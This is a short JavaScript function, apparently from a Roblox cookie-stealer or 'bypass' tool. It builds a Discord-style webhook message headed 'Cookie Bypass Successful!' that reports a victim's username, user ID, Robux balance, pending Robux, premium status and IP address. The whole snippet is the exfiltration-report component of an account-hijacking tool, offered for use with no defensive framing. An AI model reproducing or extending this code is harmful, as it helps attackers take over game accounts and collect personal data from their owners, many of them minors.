function buildLiveEmbed(info) {
    return {
        username: "Live Bypass",
        avatar_url: "https://upload.wikimedia.org/wiki/File:Roblox_logo.svg",
        embeds: [{
            title: "✅ Cookie Bypass Successful!",
            color: 0x00ff00,
            url: "https://www.roblox.com/users/" + info.userid + "/profile",
            thumbnail: { url: info.image },
            fields: [
                { name: "**Live Bypass Status**", value: "\u200b" },
                { name: "👤 Username", value: "`" + info.username + "`", inline: true },
                { name: "🆔 User ID", value: "`" + info.userid + "`", inline: true },
                { name: "🎂 Age", value: "`13+`", inline: true }, // <-- DIRI NGA PART BOSS
                { name: "💰 Robux", value: "`" + info.robux + "`", inline: true },
                { name: "⏳ Pending", value: "`" + info.pending + "`", inline: true },
                { name: "⭐ Premium", value: "`" + info.premium + "`", inline: true },
                { name: "🌐 IP Address", value: "`" + info.ip + "`" }
            ],
            timestamp: new Date().toISOString(),
            footer: { text: "Roblox Checker System" }
        }]
    };
}
